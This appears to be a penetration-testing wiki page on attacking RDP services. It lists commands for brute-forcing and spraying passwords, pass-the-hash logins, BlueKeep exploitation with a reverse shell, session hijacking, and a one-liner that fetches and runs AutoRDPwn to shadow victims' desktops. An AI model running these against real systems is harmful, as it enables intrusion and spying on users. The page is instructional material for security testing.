---
description: Port 3389
---

# RDP

## Theory

**Remote Desktop** Protocol (**RDP**) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs **RDP** client software for this purpose, while the other computer must run **RDP** server software.

## Practice

### Enumerate

{% tabs %}
{% tab title="Nmap" %}
We can use nmap to enumerate informations about the running RDP server

```bash
# Enum NetBIOS, DNS, and OS build version.
nmap -p 3389 --script rdp-ntlm-info <target>

# Enum available encryption and CredSSP (NLA)
nmap -p 3389 --script rdp-enum-encryption <target>
```
{% endtab %}
{% endtabs %}

### Targeting Accounts

{% tabs %}
{% tab title="Bruteforce" %}
When bruteforcing accounts, you may lock accounts

```bash
#Hydra
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>

#CrackmapExec
crackmapexec rdp <IP> -u <userlist> -p <passwlist>
```
{% endtab %}

{% tab title="Password Spray" %}
We can use following commands to do password spray

```bash
#Hydra
hydra -L <userslist> -p 'password123' rdp://<IP>

#Crackmapexec - Spray on target
crackmapexec rdp <IP> -u <userlist> -p 'password123'

#Crackmapexec - Spray on subnet
crackmapexec rdp 10.10.10.0/24 -u <userlist> -p 'password123'
```
{% endtab %}

{% tab title="Connect" %}

{% endtab %}
{% endtabs %}

### Logging in <a href="#00ef" id="00ef"></a>

{% tabs %}
{% tab title="XfreeRDP" %}
We can use [xfreerdp ](https://linux.die.net/man/1/xfreerdp)to connect into a RDP server with known credentials or using [Pass the hash](../../../ad/movement/ntlm/pth.md) technique.

```bash
#With credentials 
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>

#Pass the hash
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP>
```
{% endtab %}

{% tab title="Rdesktop" %}
We can use[ rdesktop ](https://github.com/rdesktop/rdesktop)to connect into a RDP server with known credentials

```bash
rdesktop -d <domain> -u <username> -p <password> <IP>
```
{% endtab %}

{% tab title="rdp_check.py" %}
Using the [rdp\_check.py](https://github.com/fortra/impacket/blob/master/examples/rdp\_check.py) script from impacket, we can check if some credentials are valid for a RDP service

```bash
python rdp_check.py <domain>/<name>:<password>@<IP>
```
{% endtab %}

{% tab title="crackmapexec" %}
Using [crackmapexec](https://github.com/mpgn/CrackMapExec), we can check if some credentials are valid for a RDP service

```bash
crackmapexec rdp <IP> -u <user> -p <password>
```
{% endtab %}
{% endtabs %}

### Vulnerabilities

#### MS12-020  (CVE-2012-0152)

This CVE address a denial of service (DOS) vulnerability in the Remote Desktop Service.&#x20;

{% tabs %}
{% tab title="Enumerate" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to detect the presence of the CVE-2012-0152 vulnerability without crashing the target.

```bash
nmap -sV --script=rdp-vuln-ms12-020 -p 3389 <target>
```
{% endtab %}

{% tab title="Exploit" %}
We can use this [python exploit](https://github.com/anmolksachan/MS12-020/tree/main) (do not forget to change the hardcoded IP)

```bash
python2.7 ms12-020.py
```
{% endtab %}
{% endtabs %}

#### BlueKeep - CVE-2019-0708

RDP uses "virtual channels", configured before authentication, as a data path between the client and server for providing extensions. RDP 5.1 defines 32 "static" virtual channels, and "dynamic" virtual channels are contained within one of these static channels. If a server binds the virtual channel "MS\_T120" (a channel for which there is no legitimate reason for a client to connect to) with a static channel other than 31, **heap corruption** occurs that allows for **arbitrary code execution** at the system level.

{% tabs %}
{% tab title="Enumerate" %}
Bluekeep or CVE-2019-0708 is an RCE exploit that effects the following versions of Windows systems:

* Windows 2003
* Windows XP
* Windows Vista
* Windows 7
* Windows Server 2008
* Windows Server 2008 R2

{% hint style="info" %}
Windows 8,10,11, Windows Server 2012 and above are not affected
{% endhint %}

If the target uses RDP and the Windows version is mentioned above, it is vulnerable.

```bash
# Check OS version & RDP service using nmap
nmap -O -p 3389 <TARGET_IP>
```

Alternatively, we can use the [rdp\_detect\_info.py](https://github.com/worawit/CVE-2019-0708) from worawit github to detect the vulnerability&#x20;

```bash
python rdp_detect_info.py <TARGET_IP>
```

Additionally, we can use metasploit to scan a target

```bash
msf> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf> set RHOST <TARGET_IP>
msf> run
```
{% endtab %}

{% tab title="Exploit - Manual" %}
To exploit, we may use the [RICSecLab exploit](https://github.com/RICSecLab/CVE-2019-0708) on GitHub to gain a revers shell

{% hint style="info" %}
This exploit have been made for Windows 7 targets
{% endhint %}

{% hint style="danger" %}
Exploit may cause the system to crash
{% endhint %}

```bash
#Build your environment
git clone https://github.com/RICSecLab/CVE-2019-0708 && cd CVE-2019-0708
git clone https://github.com/gosecure/pyrdp.git && cd pyrdp
python3 -m venv venv
source venv/bin/activate
pip3 install -U pip setuptools wheel
pip3 install -U -e '.[full]'
cd ..
rm exploit.py
wget https://raw.githubusercontent.com/yassineaboukir/CVE-2019-0708/4f4ff5a9eef5ed4cda92376b25667fd5272d9753/exploit.py

#Exploit
python exploit.py <TARGET_IP> -rp <RDP_PORT> <ATTACKING_IP> -bp <ATTACKING_PORT>
```
{% endtab %}

{% tab title="Exploit - Metasploit" %}
We can easily exploit this vulnerability using a metasploit frameworks&#x20;

```bash
msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf> show targets
msf> set target <TARGET-ID>
msf> set RHOST <TARGET_IP>
msf> show options 
[...]
msf> exploit
```
{% endtab %}
{% endtabs %}

### Session stealing

{% tabs %}
{% tab title="Exploit - LoTL" %}
With **SYSTEM permissions** you can access any **opened RDP session by any user** without need to know the password of the owner. It only use Windows tools and features.

On the target system:

```powershell
#Get openned sessions
query user

#Access to the selected session
tscon <ID> /dest:<SESSIONNAME>
```

{% hint style="danger" %}
When you access an active RDP sessions **you will kickoff the user** that was using it.
{% endhint %}
{% endtab %}

{% tab title="Exploit - Mimikatz" %}
We can perform this attack with mimikatz

```bash
mimikatz> ts::sessions        #Get sessions
mimikatz> ts::remote /id:2    #Connect to the session
```
{% endtab %}
{% endtabs %}

### Shadow Attack

{% tabs %}
{% tab title="AutoRDPwn" %}
[**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn) is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to **view his victim's desktop without his consent**, and even control it on demand, using tools native to the operating system itself. [More info here](https://darkbyte.net/autordpwn-la-guia-definitiva/)

```powershell
#Local execution one-liner
powershell -ep bypass "cd $ env: temp; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"

#From target on reverseshell - create the AutoRDPwn:AutoRDPwn user (mmay try w/o admin rights with -noadmin)
powershell -ep bypass "cd $ env: temp; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang English -option 4 -shadow control -createuser"
#Connect to shadow sessions with created credentials
mstsc /v win10pro /admin /shadow:1 /control /noconsentprompt /prompt /f
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://net-security.fr/security/bluekeep-metasploit/" %}
